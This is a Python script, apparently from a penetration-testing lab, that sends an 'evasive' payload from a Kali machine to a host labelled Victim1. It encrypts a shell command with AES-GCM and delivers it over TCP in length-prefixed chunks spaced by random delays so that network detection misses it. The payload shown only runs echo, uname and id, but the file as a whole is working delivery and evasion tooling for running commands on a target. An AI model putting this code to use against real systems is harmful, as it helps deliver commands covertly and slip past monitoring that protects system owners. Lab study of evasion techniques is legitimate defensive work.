#!/usr/bin/env python3
"""
Evasive Payload Sender Script (AES + Chunking + Timing)
Runs on Sender (e.g., Kali 192.168.100.15).

Encrypts a payload using AES-GCM, then sends it in timed,
length-prefixed chunks over TCP to the receiver.
"""
import socket
import time
import random
import struct
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# --- Configuration ---
TARGET_IP = "192.168.100.101"  # Victim1's IP address
TARGET_PORT = 4445             # Chosen port (different from previous example)
CHUNK_SIZE = 1024              # Size of payload chunks
MIN_DELAY = 0.2                # Minimum delay between sending chunks (seconds)
MAX_DELAY = 1.0                # Maximum delay between sending chunks (seconds)

# WARNING: Hardcoded key is insecure! For demo purposes only.
# Must be 16 (AES-128), 24 (AES-192), or 32 (AES-256) bytes long.
AES_KEY = b'YourSecretKey1234567890123456789' # Use a 32-byte key for AES-256

# Header format: '!I' means network byte order (big-endian), unsigned integer (4 bytes)
LENGTH_HEADER_FORMAT = '!I'
LENGTH_HEADER_SIZE = struct.calcsize(LENGTH_HEADER_FORMAT)

# --- Payload Definition ---
# Define the payload to be sent (a harmless demonstration command)
payload = "echo '[+] AES Encrypted Payload Received Successfully!'; uname -a; id"
# --------------------

def encrypt_payload(key, data):
    """Encrypts data using AES-GCM."""
    try:
        cipher = AES.new(key, AES.MODE_GCM)
        nonce = cipher.nonce # GCM nonce, must be sent to receiver
        ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
        # Return nonce, ciphertext, and tag concatenated for sending
        print(f"[D] Nonce: {nonce.hex()}")
        print(f"[D] Tag:   {tag.hex()}")
        return nonce + tag + ciphertext # Send nonce, then tag, then ciphertext
    except Exception as e:
        print(f"[!] Encryption failed: {e}")
        return None

def send_chunked_data(sock, data):
    """Sends data in length-prefixed, timed chunks."""
    total_sent = 0
    while total_sent < len(data):
        # Introduce random delay before sending next chunk
        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        print(f"[*] Waiting {delay:.2f}s...")
        time.sleep(delay)

        chunk = data[total_sent : total_sent + CHUNK_SIZE]
        chunk_len = len(chunk)

        # 1. Pack and send the length header
        try:
            length_header = struct.pack(LENGTH_HEADER_FORMAT, chunk_len)
            sock.sendall(length_header)
            # print(f"[D] Sent length header: {chunk_len}") # Debug
        except Exception as e:
            print(f"[!] Error sending length header: {e}")
            return False

        # 2. Send the actual chunk
        try:
            sock.sendall(chunk)
            # print(f"[D] Sent chunk: {len(chunk)} bytes") # Debug
            total_sent += chunk_len
        except Exception as e:
            print(f"[!] Error sending chunk data: {e}")
            return False

    print(f"[*] Finished sending {total_sent} bytes in chunks.")
    return True

def main():
    print("[*] Encrypting payload...")
    encrypted_data = encrypt_payload(AES_KEY, payload)

    if not encrypted_data:
        return # Encryption failed

    print(f"[+] Payload encrypted ({len(encrypted_data)} bytes including nonce/tag).")

    # Create a TCP socket and connect to the target
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((TARGET_IP, TARGET_PORT))
            print(f"[*] Connected to {TARGET_IP}:{TARGET_PORT}")
        except ConnectionRefusedError:
             print(f"[!] Connection refused. Is the receiver script running on {TARGET_IP}:{TARGET_PORT}?")
             return
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return

        # Send the encrypted data in chunks
        if send_chunked_data(s, encrypted_data):
             print("[*] Encrypted payload sent successfully.")
        else:
             print("[!] Failed to send payload.")

if __name__ == '__main__':
    main()
